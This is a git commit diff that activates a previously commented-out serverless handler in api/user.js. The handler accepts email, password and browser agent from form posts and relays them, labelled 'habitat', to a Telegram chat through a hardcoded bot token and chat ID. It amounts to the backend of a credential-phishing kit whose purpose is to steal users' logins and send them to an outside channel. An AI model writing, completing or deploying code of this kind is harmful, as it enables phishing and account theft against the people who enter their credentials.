49dfccffc2037acc67c6ea43036deed23da71ea1
riverarentxl-a11y <riverarentxl@gmail.com>
2026-02-18 13:15:51 +0200

    Update user.js

--- api/user.js
+++ api/user.js
@@ -1,46 +1,46 @@
-// module.exports = async function handler(req, res) {
-//   if (req.method !== 'POST') {
-//     return res.status(405).json({ error: 'Method not allowed' });
-//   }
+module.exports = async function handler(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
 
-//   console.log('bammmmmmmmm')
-//   const token = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
-//   const chatId = '-5050388811';
+  console.log('bammmmmmmmm')
+  const token = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
+  const chatId = '-5050388811';
 
-//   try {
-//     const { email, pass, agent } = req.body;
+  try {
+    const { email, pass, agent } = req.body;
 
-//     const message = `
-// 📩  habitat
+    const message = `
+📩  habitat
 
-// 📧 Email: ${email}
-// 🔑 Pass: ${pass}
-// 🖥️ Agent: ${agent}
-//     `;
+📧 Email: ${email}
+🔑 Pass: ${pass}
+🖥️ Agent: ${agent}
+    `;
 
-//     const tgRes = await fetch(
-//       `https://api.telegram.org/bot${token}/sendMessage`,
-//       {
-//         method: 'POST',
-//         headers: { 'Content-Type': 'application/json' },
-//         body: JSON.stringify({
-//           chat_id: chatId,
-//           text: message
-//         })
-//       }
-//     );
+    const tgRes = await fetch(
+      `https://api.telegram.org/bot${token}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }
+    );
 
-//     const data = await tgRes.json();
+    const data = await tgRes.json();
 
-//     return res.status(200).json({
-//       ok: true,
-//       telegram: data
-//     });
+    return res.status(200).json({
+      ok: true,
+      telegram: data
+    });
 
-//   } catch (err) {
-//     return res.status(500).json({
-//       error: 'Server error',
-//       details: err.message
-//     });
-//   }
-// };
+  } catch (err) {
+    return res.status(500).json({
+      error: 'Server error',
+      details: err.message
+    });
+  }
+};
